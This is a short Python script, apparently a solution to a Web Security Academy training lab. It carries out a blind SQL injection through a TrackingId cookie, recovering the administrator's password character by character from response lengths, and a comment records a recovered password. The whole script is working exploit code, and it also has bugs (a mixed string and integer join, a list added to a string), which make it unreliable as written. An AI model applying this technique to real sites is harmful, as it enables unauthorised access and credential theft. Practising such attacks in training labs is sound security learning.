import requests
import string
url = "https://0a9900cb04c87d8681065ca8007a009a.web-security-academy.net/"

s = requests.Session()
dummp_cookie = "ec7dB3N2hSQjQz7Y"
numbers = [1,2,3,4,5,6,7,8,9,0]
apha_numeric_string = list(string.ascii_letters)+numbers
query_strings = "".join(apha_numeric_string)
print ("[+] These are the number of parameters that we are going to test --> " + query_strings)
extractedpassword = []
for x in range(1,22):
    #print("Currently the extracted password is: " + extractedpassword)
    for alpha in apha_numeric_string:
        ck  = {
        "TrackingId":dummp_cookie + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {}, 1) = '{}".format(x,alpha)
        }
        req = s.get(url=url,cookies=ck)
        ct_len = req.headers
        l = ct_len["Content-Length"]
        if (l != '1723'):
            extractedpassword.append(alpha)
            print(ck,l)
            break
    else:
        extractedpassword.append("")
#req = s.get(url=url,cookies=ck)

#print(s.headers)
#print(req.headers)
#print(req.text)
#extracted password --> v8lthsfxguakabans
print("Cracked password --> " + extractedpassword)
s.close()
